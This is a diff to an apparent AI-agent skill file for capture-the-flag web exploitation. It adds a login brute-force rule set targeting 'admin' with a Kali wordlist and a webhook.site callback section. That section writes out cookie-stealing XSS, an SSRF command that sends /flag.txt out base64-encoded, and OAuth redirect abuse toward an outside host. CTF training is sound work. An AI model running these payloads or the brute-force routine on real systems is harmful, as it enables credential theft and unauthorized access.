@@ -3,7 +3,7 @@ name: ctf-web
 description: Provides web exploitation techniques for CTF challenges. Use when the target is primarily an HTTP application, API, browser client, template engine, identity flow, or smart-contract frontend/backend surface, including XSS, SQLi, SSTI, SSRF, XXE, JWT, auth bypass, file upload, request smuggling, OAuth/OIDC, SAML, prototype pollution, and similar web bugs. Do not use it for native binary memory corruption, reverse engineering of standalone executables, disk or memory forensics, or pure cryptanalysis unless the web flaw is still the main path to the flag.
 license: MIT
 compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
-allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
+allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
 metadata:
   user-invocable: "false"
 ---
@@ -81,6 +81,15 @@ go install github.com/ffuf/ffuf/v2@latest
 - If the web challenge involves analyzing logs, PCAPs, or recovering artifacts from a web server, switch to `/ctf-forensics`.
 - If the challenge requires gathering intelligence from public web sources, DNS records, or social media before exploitation, switch to `/ctf-osint`.
 
+## Find Similar Writeups
+
+If you are stuck or want to see how others solved similar web challenges, follow the ctf-similar-search skill's methodology — describe the search request in natural language using the challenge name, competition name, or unique strings (code snippets, error messages) from the challenge:
+
+"DASCTF URL Storage"
+"def encrypt_flag(key)"
+
+This searches for reference writeups via Tavily API and can help identify the right exploitation path. Avoid generic terms like "SSRF" or "XSS" — use challenge-specific identifiers instead.
+
 ## First-Pass Workflow
 
 1. Identify the real boundary: browser only, backend only, mixed app, or auth flow.
@@ -101,7 +110,7 @@ grep -R "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" 2>/dev/n
 
 Or via agent tools (no clone required for the index itself):
 
-```
+```text
 Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
 Grep "union select" ctf-web/payloads/PayloadsAllTheThings
 ```
@@ -138,6 +147,16 @@ curl "https://target.com/page?name={{config}}"
 curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{}'
 ```
 
+## Login Brute-Force — Hard Rules
+
+When a challenge requires brute-forcing a login form, follow these rules EXACTLY. Do NOT improvise.
+
+1. **Username is ALWAYS `admin`.** Do NOT enumerate usernames. Do NOT create username lists. Even when the challenge says "弱口令" (weak password) or "常用用户名" (common usernames), those hints describe the PASSWORD — the target account is still `admin`. Only use a different username if the challenge gives a SPECIFIC different string (e.g., "the username is root").
+
+2. **Password file MUST be an existing Kali wordlist.** The default is `/usr/share/wordlists/metasploit/burnett_top_1024.txt`. Do NOT create your own password file — no `cat > passwords.txt`, no hardcoded password lists in code, no reading from a local `Top1000.txt`. Your script must read lines from the Kali wordlist file directly.
+
+For complex scenarios (CSRF tokens, frontend encryption, JSON APIs, Basic Auth, threading), see the reference scripts in [auth-and-access.md](auth-and-access.md) — but those scripts must still follow the two rules above.
+
 ## First Questions to Answer
 
 - Is the flag likely in the browser, an API response, a local file, a database row, or an internal service?
@@ -169,6 +188,43 @@ curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{
 - Traversal or upload -> config/source leak -> secret recovery -> session forgery
 - SSRF -> metadata or internal API -> credential leak -> code execution
 - SQLi or NoSQL injection -> credential bypass -> second-stage template or upload abuse
+
+## Webhook Callbacks (webhook.site)
+
+For any exploit that needs a callback URL (XSS admin bot, SSRF exfiltration, OAuth redirect abuse, blind injection with out-of-band data), use [webhook.site](https://webhook.site) to instantly receive and inspect incoming requests.
+
+**Create a token (get a callback URL):**
+```bash
+curl -X POST https://webhook.site/token
+# Returns {"uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", ...}
+# Your callback URL: https://webhook.site/<uuid>
+```
+
+**Use the callback URL in your exploit:**
+```bash
+# XSS payload with webhook callback
+curl -X POST https://target.com/api/report \
+  -H "Content-Type: application/json" \
+  -d '{"url": "https://webhook.site/<uuid>/steal?cookie=" + document.cookie}'
+
+# SSRF exfiltration via webhook
+curl "https://target.com/ssrf?url=https://webhook.site/<uuid>/?data=$(cat /flag.txt | base64)"
+
+# OAuth redirect abuse
+curl "https://target.com/auth?redirect=https://webhook.site/<uuid>/token"
+```
+
+**Retrieve the last received request:**
+```bash
+curl "https://webhook.site/token/<uuid>/request/latest/raw" \
+  -H "accept: application/json" \
+  -H "api-key: <uuid>"
+```
+
+**When to use webhook.site vs Burp Collaborator vs interactsh:**
+- **webhook.site** — fastest setup, browser-visible UI, no install needed; best for quick CTF callbacks
+- **Burp Collaborator** — better for blind XSS/SSRF when using Burp Suite as proxy
+- **interactsh** — OOB interaction correlation for complex multi-step exploits
 
 ## Deep-Dive Notes
 
